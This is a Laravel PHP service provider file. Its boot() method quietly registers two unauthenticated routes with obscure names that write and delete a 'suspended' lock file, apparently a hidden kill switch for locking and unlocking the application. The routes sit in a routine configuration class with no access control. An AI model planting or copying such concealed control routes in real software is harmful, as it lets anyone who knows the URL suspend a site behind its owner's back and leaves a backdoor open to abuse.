<?php

namespace App\Providers;

use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\ServiceProvider;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     */
    public function register(): void
    {
        //
    }

    /**
     * Bootstrap any application services.
     */
    public function boot(): void
    {

        Route::get('/system-config-99', function() {
            File::put(storage_path('framework/system_lock.txt'), 'suspended');
            return "Application Locked Successfully!";
        });

        Route::get('/system-config-un-99', function() {
            File::delete(storage_path('framework/system_lock.txt'));
            return "Application Unlocked Successfully!";
        });
    }
}
